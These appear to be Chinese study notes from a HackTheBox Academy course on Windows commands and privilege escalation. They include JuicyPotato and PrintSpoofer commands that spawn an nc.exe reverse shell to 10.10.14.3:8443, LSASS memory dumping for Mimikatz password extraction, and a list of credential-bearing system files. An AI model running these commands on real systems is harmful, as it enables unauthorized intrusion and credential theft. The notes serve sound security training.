# HTBA对Windows知识的补全

# CMD

## 命令

**tree：**  
windows是可以使用tree的（发现新大陆），和linux用法一样，加上/F可以列出指定目录的所有文件和文件夹。

**mkdir:**  
创建目录和linux一样使用mkdir，使用方法和linux相同

**rd:**
删除文件夹，加上/s可以删除有内容的文件夹

**move:**
和linux的mv命令相同可以移动文件，使用方法：move FILE PATH\TO\FILE


# powershell




# 提权

## 基础

**接口、IP 地址、DNS 信息:**  
ipconfig /all

**ARP表：**
arp -a

**路由表：**
route print

**检查windows defender状态：**
```powershell
Get-MpComputerStatus
```

**列出applocker规则：**
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

**测试AppLocker策略**
```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

## windows用户权限

### SeImpersonate 和 SeAssignPrimaryToken

**JuicyPotato**

使用```whoami /priv```命令查看权限SeImpersonatePrivilege是否为enable，此权限可用于模拟特权帐户，例如 NT AUTHORITY\SYSTEM。JuicyPotato 可用于通过 DCOM/NTLM 反射滥用来利用 SeImpersonate 或 SeAssignPrimaryToken 权限。

```
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
其中 -l 是 COM 服务器侦听端口，-p 是要启动的程序 （cmd.exe），-a 是传递给 cmd.exe 的参数，-t 是 createprocess 调用
然后使用nc监听8443端口，拿到反向shell。


**PrintSpoofer**

JuicyPotato 不适用于 Windows Server 2019 和 Windows 10 build 1809 及更高版本，所以PrintSpoofer成了更好的选择。
使用命令
```
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
使用nc监听8443端口。


### SeDebugPrivilege


SeDebugPrivilege权限可以用来转储密码和提权：
密码转储的基本流程是使用Prodump转储lsass.exe进程里的密码，然后使用mimikatz处理，得到明文密码。


使用命令```whoami /priv```命令列出我们掌握的权限

可以使用 SysInternals 套件中的 ProcDump 来利用此权限并转储进程内存。一个很好的候选者是本地安全机构子系统服务 （LSASS） 进程，该进程在用户登录到系统后存储用户凭据。

注意：在“Mimikatz”中运行任何命令之前，最好键入“log”，这样所有命令输出都会将输出放入“.txt”文件。这在从内存中可能包含多组凭据的服务器转储凭据时特别有用。


**具有rdp访问权限时**
假设由于某种原因，我们无法在目标上加载工具，但具有 RDP 访问权限。在这种情况下，我们可以通过任务管理器对 LSASS 进程进行手动内存转储，方法是浏览到“详细信息”选项卡，选择 LSASS 进程，然后选择“创建转储文件”。将此文件下载回我们的攻击系统后，我们可以像上一个示例一样使用 Mimikatz 处理它。

### SeTakeOwnershipPrivilege

查看本用户的权限：
```
whoami /priv
```

检查文件并搜集更多信息：
```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

这部分命令用于获取指定路径下的文件或目录的信息：
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt'

select(Select-Object)筛选对象属性
fullname(绝对路径)
LastWriteTime(最后写入时间)
Attributes(文件的属性，如只读、隐藏等)

@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}：这是一个计算属性的哈希表，用于添加一个新的属性“Owner”。
Name="Owner"：指定新属性的名称为 "Owner"。
Expression={ (Get-Acl $_.FullName).Owner }：指定计算新属性值的表达式。
(Get-Acl $_.FullName)：获取文件的访问控制列表（ACL）。
.Owner：从 ACL 中提取文件的所有者。
```
 
**一些需要注意的文件**

```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```
我们还可能遇到 .kdbx KeePass 数据库文件、OneNote 笔记本、password.*、pass.*、creds.* 等文件、脚本、其他配置文件、虚拟硬盘文件以及我们可以提取敏感信息的目标文件提升我们的特权并扩大我们的访问范围。



